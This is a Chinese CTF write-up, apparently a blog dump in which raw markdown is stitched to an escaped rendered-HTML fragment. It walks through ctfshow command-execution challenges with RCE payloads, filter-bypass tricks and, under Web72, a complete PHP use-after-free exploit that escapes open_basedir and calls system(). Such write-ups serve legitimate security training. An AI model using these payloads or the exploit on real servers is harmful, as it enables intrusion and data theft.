只能一个一个试过去\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif)\r\n\r\n> 直接读文件\r\n\r\n### Web59\r\n\r\n> 跟上题一样，啥也不知道\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image020.gif)\r\n\r\n> 还是直接读就读出来了\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif)\r\n\r\n### Web60\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image024.gif)\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif)\r\n\r\n### Web61 62\r\n\r\n> 还是和上一题一样的\r\n\r\n### Web66\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image028.gif)\r\n\r\n> 查看目录\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image030.gif)\r\n\r\n> Print_r和var_dump 作用差不多可以替换\r\n\r\n> 2.var_dump()和print_r()的区别\r\n\r\n> 共同点：两者都可以打印数组，对象之类的复合型变量。\r\n\r\n> 区别：print_r() 只能打印一些易于理解的信息，且print_r()在打印数组时，会将把数组的指针移到最后边，使用 reset() 可让指针回到开始处。 而var_dump()不但能打印复合类型的数据，还能打印资源类型的变量。且var_dump()输出的信息则比较详细，一般调试时用得多。\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image032.gif)\r\n\r\n### Web67\r\n\r\n> 和上一题一样\r\n\r\n### Web68\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image034.gif)\r\n\r\n> 常规查目录\r\n\r\n![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif)\r\n\r\n> 这次禁用了show_source 和highlingt_file\r\n\r\n> 用include![img](file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif)\r\n\r\n \r\n\r\n> 然后就RCE\r\n\r\n### Web70\r\n\r\n> Var_dump print_r被禁 还可以使用var_export\r\n\r\n> var_export() 函数用于输出或返回一个变量，以字符串形式表示。\r\n\r\n> var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。\r\n\r\n![image-20230530202004081](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020137.png)\r\n\r\n> 还是一样include方法做\r\n\r\n### Web71\r\n\r\n![image-20230530203443557](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302034605.png)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020667.gif)\r\n\r\n> [PHP详解ob_clean,ob_start和ob_get_contents函数](https://blog.csdn.net/weixin_34214500/article/details/85920870?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=2)\r\n\r\n> 这道题是先将缓冲区的内容存在s变量中，然后执行清空缓冲区可以忽略前面所有输出，再通过替换输出s变量形成看到的题目。\r\n\r\n> 可以用exit（）直接终端进程\r\n\r\n![image-20230530203500613](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302035672.png)\r\n\r\n\r\n\r\n### Web72![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020669.gif)\r\n\r\n> 无权限  用glob伪协议遍历目录 (通用版)\r\n\r\n```\r\nc=$a="glob:///*.txt";\r\nif($b=opendir($a)){\r\n\twhile(($a=readdir($b))!==false){\r\n\techo "filename:".$a."\\n";\r\n}\r\nclosedir($b);\r\n}\r\nexit();\r\n或者\r\nc=?><?php $a=new DirectoryIterator("glob://./*");\r\nforeach($a as $f)\r\n{echo($f->__toString().\' \');\r\n}\r\nexit(0);\r\n?>\r\n```\r\n\r\n> 然后利用uaf漏洞来读取 \r\n\r\n> 看了关于uaf漏洞的笔记：[漏洞学习笔记——UAF漏洞_孤月丶星辰的博客-CSDN博客_uaf漏洞](https://blog.csdn.net/musilintan/article/details/116309734?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&utm_relevant_index=1)\r\n\r\n> uaf绕过open_basedir执行命令\r\n> poc（需要url编码）\r\n>\r\n> ```\r\n> <?php\r\n> \r\n> function ctfshow($cmd) {\r\n>     global $abc, $helper, $backtrace;\r\n> \r\n> class Vuln {\r\n>     public $a;\r\n>     public function __destruct() { \r\n>         global $backtrace; \r\n>         unset($this->a);\r\n>         $backtrace = (new Exception)->getTrace();\r\n>         if(!isset($backtrace[1][\'args\'])) {\r\n>             $backtrace = debug_backtrace();\r\n>         }\r\n>     }\r\n> }\r\n> \r\n> class Helper {\r\n>     public $a, $b, $c, $d;\r\n> }\r\n> \r\n> function str2ptr(&$str, $p = 0, $s = 8) {\r\n>     $address = 0;\r\n>     for($j = $s-1; $j >= 0; $j--) {\r\n>         $address <<= 8;\r\n>         $address |= ord($str[$p+$j]);\r\n>     }\r\n>     return $address;\r\n> }\r\n> \r\n> function ptr2str($ptr, $m = 8) {\r\n>     $out = "";\r\n>     for ($i=0; $i < $m; $i++) {\r\n>         $out .= sprintf("%c",($ptr & 0xff));\r\n>         $ptr >>= 8;\r\n>     }\r\n>     return $out;\r\n> }\r\n> \r\n> function write(&$str, $p, $v, $n = 8) {\r\n>     $i = 0;\r\n>     for($i = 0; $i < $n; $i++) {\r\n>         $str[$p + $i] = sprintf("%c",($v & 0xff));\r\n>         $v >>= 8;\r\n>     }\r\n> }\r\n> \r\n> function leak($addr, $p = 0, $s = 8) {\r\n>     global $abc, $helper;\r\n>     write($abc, 0x68, $addr + $p - 0x10);\r\n>     $leak = strlen($helper->a);\r\n>     if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\r\n>     return $leak;\r\n> }\r\n> \r\n> function parse_elf($base) {\r\n>     $e_type = leak($base, 0x10, 2);\r\n> \r\n> ​    $e_phoff = leak($base, 0x20);\r\n> ​    $e_phentsize = leak($base, 0x36, 2);\r\n> ​    $e_phnum = leak($base, 0x38, 2);\r\n> \r\n> ​    for($i = 0; $i < $e_phnum; $i++) {\r\n> ​        $header = $base + $e_phoff + $i * $e_phentsize;\r\n> ​        $p_type  = leak($header, 0, 4);\r\n> ​        $p_flags = leak($header, 4, 4);\r\n> ​        $p_vaddr = leak($header, 0x10);\r\n> ​        $p_memsz = leak($header, 0x28);\r\n> \r\n> ​        if($p_type == 1 && $p_flags == 6) { \r\n> \r\n> ​            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\r\n> ​            $data_size = $p_memsz;\r\n> ​        } else if($p_type == 1 && $p_flags == 5) { \r\n> ​            $text_size = $p_memsz;\r\n> ​        }\r\n> ​    }\r\n> \r\n> ​    if(!$data_addr || !$text_size || !$data_size)\r\n> ​        return false;\r\n> \r\n> ​    return [$data_addr, $text_size, $data_size];\r\n> }\r\n> \r\n> function get_basic_funcs($base, $elf) {\r\n>     list($data_addr, $text_size, $data_size) = $elf;\r\n>     for($i = 0; $i < $data_size / 8; $i++) {\r\n>         $leak = leak($data_addr, $i * 8);\r\n>         if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n>             $deref = leak($leak);\r\n>             \r\n>             if($deref != 0x746e6174736e6f63)\r\n>                 continue;\r\n>         } else continue;\r\n> \r\n> ​        $leak = leak($data_addr, ($i + 4) * 8);\r\n> ​        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\r\n> ​            $deref = leak($leak);\r\n> ​            \r\n> ​            if($deref != 0x786568326e6962)\r\n> ​                continue;\r\n> ​        } else continue;\r\n> \r\n> ​        return $data_addr + $i * 8;\r\n> ​    }\r\n> }\r\n> \r\n> function get_binary_base($binary_leak) {\r\n>     $base = 0;\r\n>     $start = $binary_leak & 0xfffffffffffff000;\r\n>     for($i = 0; $i < 0x1000; $i++) {\r\n>         $addr = $start - 0x1000 * $i;\r\n>         $leak = leak($addr, 0, 7);\r\n>         if($leak == 0x10102464c457f) {\r\n>             return $addr;\r\n>         }\r\n>     }\r\n> }\r\n> \r\n> function get_system($basic_funcs) {\r\n>     $addr = $basic_funcs;\r\n>     do {\r\n>         $f_entry = leak($addr);\r\n>         $f_name = leak($f_entry, 0, 6);\r\n> \r\n> ​        if($f_name == 0x6d6574737973) {\r\n> ​            return leak($addr + 8);\r\n> ​        }\r\n> ​        $addr += 0x20;\r\n> ​    } while($f_entry != 0);\r\n> ​    return false;\r\n> }\r\n> \r\n> function trigger_uaf($arg) {\r\n> \r\n> ​    $arg = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\r\n> ​    $vuln = new Vuln();\r\n> ​    $vuln->a = $arg;\r\n> }\r\n> \r\n> if(stristr(PHP_OS, \'WIN\')) {\r\n>     die(\'This PoC is for *nix systems only.\');\r\n> }\r\n> \r\n> $n_alloc = 10; \r\n> $contiguous = [];\r\n> for($i = 0; $i < $n_alloc; $i++)\r\n>     $contiguous[] = str_shuffle(\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\');\r\n> \r\n> trigger_uaf(\'x\');\r\n> $abc = $backtrace[1][\'args\'][0];\r\n> \r\n> $helper = new Helper;\r\n> $helper->b = function ($x) { };\r\n> \r\n> if(strlen($abc) == 79 || strlen($abc) == 0) {\r\n>     die("UAF failed");\r\n> }\r\n> \r\n> $closure_handlers = str2ptr($abc, 0);\r\n> $php_heap = str2ptr($abc, 0x58);\r\n> $abc_addr = $php_heap - 0xc8;\r\n> \r\n> write($abc, 0x60, 2);\r\n> write($abc, 0x70, 6);\r\n> \r\n> write($abc, 0x10, $abc_addr + 0x60);\r\n> write($abc, 0x18, 0xa);\r\n> \r\n> $closure_obj = str2ptr($abc, 0x20);\r\n> \r\n> $binary_leak = leak($closure_handlers, 8);\r\n> if(!($base = get_binary_base($binary_leak))) {\r\n>     die("Couldn\'t determine binary base address");\r\n> }\r\n> \r\n> if(!($elf = parse_elf($base))) {\r\n>     die("Couldn\'t parse ELF header");\r\n> }\r\n> \r\n> if(!($basic_funcs = get_basic_funcs($base, $elf))) {\r\n>     die("Couldn\'t get basic_functions address");\r\n> }\r\n> \r\n> if(!($zif_system = get_system($basic_funcs))) {\r\n>     die("Couldn\'t get zif_system address");\r\n> }\r\n> \r\n> $fake_obj_offset = 0xd0;\r\n> for($i = 0; $i < 0x110; $i += 8) {\r\n>     write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\r\n> }\r\n> \r\n> write($abc, 0x20, $abc_addr + $fake_obj_offset);\r\n> write($abc, 0xd0 + 0x38, 1, 4); \r\n> write($abc, 0xd0 + 0x68, $zif_system); \r\n> \r\n> ($helper->b)($cmd);\r\n> exit();\r\n> \r\n> }\r\n> \r\n> ctfshow("cat /flag0.txt");ob_end_flush();\r\n> ?>\r\n> ```\r\n>\r\n> \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020682.gif)\r\n\r\n### Web73\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020884.gif)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020022.gif)\r\n\r\n> 还是glob遍历\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020067.gif)\r\n\r\n用上脚本发现strlen被ban了\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020097.gif)\r\n\r\n> 看其他师傅的wp include是没有被ban掉的 做题定向思维了 这应该是非预期解了\r\n\r\n### Web74\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020282.gif) \r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020339.gif)\r\n\r\n> 和上一题一样\r\n\r\n### Web75\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020432.gif)\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020507.gif)\r\n\r\n> 这道题是用了pdo连接mysql操作方法 不是特别明白 先跳过\r\n\r\n',contentRendered:'<h2 id="命令执行" tabindex="-1"><a class="header-anchor" href="#命令执行" aria-hidden="true">#</a> 命令执行</h2>\n<h3 id="web29-37" tabindex="-1"><a class="header-anchor" href="#web29-37" aria-hidden="true">#</a> Web29-37</h3>\n<blockquote>\n<p>都使用get传参，</p>\n</blockquote>\n<blockquote>\n<p>根据被屏蔽的字词的不同考虑不同的解法</p>\n<p>（1）system（“”）；执行一系列查看文件操作</p>\n<p>（2）都可以一把梭 如果只对get的参数c进行限制 用eval（$_GET[]）来进行参数逃逸   如果（）被过滤可以考虑使用结构语言 include require print echo inset unset</p>\n</blockquote>\n<blockquote>\n<p>常用Payload   ?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>\n</blockquote>\n<blockquote>\n<p>Filter伪协议 常用于读取文件/源码</p>\n</blockquote>\n<h3 id="web39" tabindex="-1"><a class="header-anchor" href="#web39" aria-hidden="true">#</a> Web39</h3>\n<blockquote>\n<p>使用了include文件包含，使用伪协议date 使后面的语句不是当成字符串类型，可以当成php语句被执行</p>\n</blockquote>\n<blockquote>\n<p>短标签就是把&lt;?php 换成&lt;?=  前提是这个功能打开</p>\n</blockquote>\n<blockquote>\n<p>Payload</p>\n<div class="language-php ext-php line-numbers-mode"><pre v-pre class="language-php"><code>?c=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span>“tac f<span class="token operator">*</span>”<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301424026.png" alt="image-20230530142400973" style="zoom: 50%;" />\n</blockquote>\n<h3 id="web40" tabindex="-1"><a class="header-anchor" href="#web40" aria-hidden="true">#</a> Web40</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530153304420" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301533464.png" data="aurora"></p>\n<blockquote>\n<p><strong>RCE无参数</strong></p>\n</blockquote>\n<blockquote>\n<p>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</p>\n</blockquote>\n<blockquote>\n<p>scandir()：获取目录下的文件，scandir(.)：获取当前目录下所有文件</p>\n</blockquote>\n<blockquote>\n<p>pos()：返回数组中的当前元素的值。</p>\n</blockquote>\n<blockquote>\n<p>array_reverse()：数组逆序</p>\n</blockquote>\n<blockquote>\n<p>next()： 函数将内部指针指向数组中的下一个元素，并输出。</p>\n</blockquote>\n<blockquote>\n<p>highlight_file()：函数进行文件内容的读取，并输出(也可用show_source)</p>\n</blockquote>\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301850412.png" alt="image-20230530185039088" style="zoom: 50%;" />\n<blockquote>\n<p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p>\n</blockquote>\n<blockquote>\n<p>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>\n</blockquote>\n <img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301534285.png" alt="image-20230530153424249" style="zoom:50%;" />\n<h3 id="web43" tabindex="-1"><a class="header-anchor" href="#web43" aria-hidden="true">#</a> Web43<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932136.gif" alt="img"  /></h3>\n<blockquote>\n<p>代码中插入了&gt;/dev/null 2&gt;&amp;1，“&gt;/dev/null 2&gt;&amp;1”的作用就是不回显。</p>\n</blockquote>\n<blockquote>\n<p>（分隔符进行分割绕过）这道题和上一题差不多，不一样的是屏蔽了；可以用%0a绕过或者(%26%26)&amp;&amp;或者(%27%27)||绕过</p>\n</blockquote>\n<blockquote>\n<p>不是很明白的一个点&amp;&amp;需要url编码 但是||却不要  原因：在URL内的所有不安全的字符必须被编码。保留的，预留的(Reserved)：许多URL方案为特殊的意义保留了某些字符：它们在部分URL指定方案中出现。如果相应八字节的字符是方案内部的保留字，那它必须被编码。字符; , / , ? , : , @ , = &amp;可能被某个方案预留用作特殊意义。在其他方案中不能保留其他字符。当一个八字节由一个字符表示并且被编码时，URL通常具有相同的解释。 但是，对于保留字符而言，这不是真的：编码一个为特定方案保留的字符可能会改变URL的语义。因此，在URL中数字、字母、特殊字符$ -_。+！*()以及保留字符要经过解码(unencoded)后才使用。另一方面，只要它们不用于保留目的，可以在URL指定方案中编码不需要编码的字符（包括字母数字）。</p>\n</blockquote>\n<blockquote>\n<p>Payload：?c=tac f*||</p>\n</blockquote>\n<h3 id="web44" tabindex="-1"><a class="header-anchor" href="#web44" aria-hidden="true">#</a> Web44</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932183.gif" data="aurora"></p>\n<blockquote>\n<p>跟上面一题一样 多了过滤flag 用通配符就行</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932182.gif" data="aurora"></p>\n<h3 id="web45" tabindex="-1"><a class="header-anchor" href="#web45" aria-hidden="true">#</a> Web45</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932180.gif" data="aurora"></p>\n<blockquote>\n<p>没什么特别的多了过滤空格常见方法如下</p>\n</blockquote>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>%09（url传递）  表示的是tab (cat%09flag.php)\n${IFS}\n$IFS$9\n&lt;>（cat&lt;>flag）\n&lt;（cat&lt;flag）\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><blockquote>\n<p>{cat,flag}原理参考：https://blog.csdn.net/m0_56059226/article/details/117997472</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932177.gif" data="aurora"></p>\n<h3 id="web46" tabindex="-1"><a class="header-anchor" href="#web46" aria-hidden="true">#</a> Web46<img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932197.gif" data="aurora"></h3>\n<blockquote>\n<p>过滤多了数字 由于%09(tab)绕过空格解码后代表的是tab不属于数字不会被过滤</p>\n</blockquote>\n<blockquote>\n<p>过滤了$ $$$所以不能用${IFS}绕过空格</p>\n</blockquote>\n<blockquote>\n<p>沿用上一题的payload就行</p>\n</blockquote>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932854.gif" alt="img" style="zoom: 80%;" />\n<h3 id="web47" tabindex="-1"><a class="header-anchor" href="#web47" aria-hidden="true">#</a> Web47</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932883.gif" data="aurora"></p>\n<blockquote>\n<p>过滤了more less 等查看文件的命令 （more:一页一页的显示档案内容</p>\n</blockquote>\n<blockquote>\n<p>less:与 more 类似</p>\n</blockquote>\n<blockquote>\n<p>head:查看头几行</p>\n</blockquote>\n<blockquote>\n<p>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p>\n</blockquote>\n<blockquote>\n<p>tail:查看尾几行</p>\n</blockquote>\n<blockquote>\n<p>nl：显示的时候，顺便输出行号</p>\n</blockquote>\n<blockquote>\n<p>od:以二进制的方式读取档案内容</p>\n</blockquote>\n<blockquote>\n<p>vi:一种编辑器，这个也可以查看</p>\n</blockquote>\n<blockquote>\n<p>vim:一种编辑器，这个也可以查看</p>\n</blockquote>\n<blockquote>\n<p>sort:可以查看</p>\n</blockquote>\n<blockquote>\n<p>uniq:可以查看</p>\n</blockquote>\n<blockquote>\n<p>file -f:报错出具体内容）还是一样用tac没什么好说的</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932941.gif" data="aurora"></p>\n<h3 id="web48" tabindex="-1"><a class="header-anchor" href="#web48" aria-hidden="true">#</a> Web48</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932045.gif" data="aurora"></p>\n<blockquote>\n<p>还是过滤多了sed cut等Linux命令</p>\n</blockquote>\n<blockquote>\n<p>用上一题payload</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932120.gif" data="aurora"></p>\n<h3 id="web49" tabindex="-1"><a class="header-anchor" href="#web49" aria-hidden="true">#</a> Web49</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932159.gif" data="aurora"></p>\n<blockquote>\n<p>多了% 不过跟题目没啥关系 沿用上题payload</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932249.gif" data="aurora"></p>\n<h3 id="web50" tabindex="-1"><a class="header-anchor" href="#web50" aria-hidden="true">#</a> Web50</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932321.gif" data="aurora"></p>\n<blockquote>\n<p>过滤了&amp;（%26）和tab（%09） 一样啊 用&lt;绕过空格</p>\n</blockquote>\n<blockquote>\n<p>但是不能用？通配符 ？？？</p>\n</blockquote>\n<blockquote>\n<p>利用shall特性用’’或者””或者\\隔开被过滤的字符串(原理：还有一个小知识，之前我在纠结为什么ca\\t或者c\\at的效果和cat一样，后来经过东拼西凑的问大佬和尝试，最后总结的原因是因为在linux里面当转义符号()转义普通字符的时候，和普通字符原来的效果是一样的，意思就是\\t和t都是t，只有在转义特殊字符的时候，才起了作用，比如$，$则不再表示变量的意思。)</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932459.gif" data="aurora"></p>\n<h3 id="web51" tabindex="-1"><a class="header-anchor" href="#web51" aria-hidden="true">#</a> Web51</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932519.gif" data="aurora"></p>\n<blockquote>\n<p>多过滤了tac 换个nl继续用</p>\n</blockquote>\n<blockquote>\n<p>或者继续ta\\c</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932556.gif" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932584.gif" data="aurora"></p>\n<h3 id="web52" tabindex="-1"><a class="header-anchor" href="#web52" aria-hidden="true">#</a> Web52</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932748.gif" data="aurora"></p>\n<blockquote>\n<p>常规去做 发现过滤了上一题的&lt;&gt; 有点惯性思维去找其他解题方法 没有看见没有过滤$</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932787.gif" data="aurora"></p>\n<blockquote>\n<p>发现被耍了 这个flag.php中不是答案</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932833.gif" data="aurora"></p>\n<blockquote>\n<p>查看根目录下的文件夹 发现是有flag这个文件的 有两个想法 一个是直接读取里面的文件，一个是把flag复制到当前文件夹中</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932977.gif" data="aurora"></p>\n<blockquote>\n<p>二可行</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932039.gif" data="aurora"></p>\n<blockquote>\n<p>查看一下flag这个文件的权限有rx，应该是可以读</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932154.gif" data="aurora"></p>\n<h3 id="web53" tabindex="-1"><a class="header-anchor" href="#web53" aria-hidden="true">#</a> Web53</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932289.gif" data="aurora"></p>\n<blockquote>\n<p>看了一下是echo函数 然后多了变量d后会system$c</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932337.gif" data="aurora"></p>\n<blockquote>\n<p>常规看一下文件内容 有flag.php 直接看</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932487.gif" data="aurora"></p>\n<h3 id="web54" tabindex="-1"><a class="header-anchor" href="#web54" aria-hidden="true">#</a> Web54</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932592.gif" data="aurora"></p>\n<blockquote>\n<p>在正则中 .*c.*a.*t.*相当于cat中不能穿插任何字符了，所以不能用’’绕过 考虑用mv对文件重命名</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932758.gif" data="aurora"></p>\n<h3 id="web55" tabindex="-1"><a class="header-anchor" href="#web55" aria-hidden="true">#</a> Web55</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301932832.gif" data="aurora"></p>\n<blockquote>\n<p>过滤了所有字母,查了资料 有两种解法 一种是通过执行的上传文件 另一种是通过/bin/base64输出flag</p>\n</blockquote>\n<blockquote>\n<p>第二种方法试了下发现不能用</p>\n</blockquote>\n<blockquote>\n<p>仔细研究了p神的文章https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</p>\n</blockquote>\n<blockquote>\n<p>具体方法：。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。（1. &quot; ./ “ 的方式类似于新建了一个shell， 在这个新建的shell中去执行脚本中的程序，类似于新建了一个子进程，但这个子进程不继承父进程的所有非export类型的变量，并且脚本中对非export环境变量的创建或修改不会反馈到外部调用shell中</p>\n</blockquote>\n<blockquote>\n<p>\\2. ” . &quot; 的方式类似于将脚本中的每一行指令逐条在当前shell中执行，因此它继承了当前shell的环境变量，同时脚本中对环境变量的修改也可以反馈到shell中）</p>\n</blockquote>\n<blockquote>\n<p>上传的文件会临时储存在一个地址下一般为/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。最后构造POC，执行任意命令</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530200618504" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006557.png" data="aurora"></p>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530200629352" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302006428.png" data="aurora"></p>\n<blockquote>\n<p>最后rce</p>\n</blockquote>\n<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302007840.png" alt="image-20230530200713771"  />\n<h3 id="web56" tabindex="-1"><a class="header-anchor" href="#web56" aria-hidden="true">#</a> Web56</h3>\n<p><img 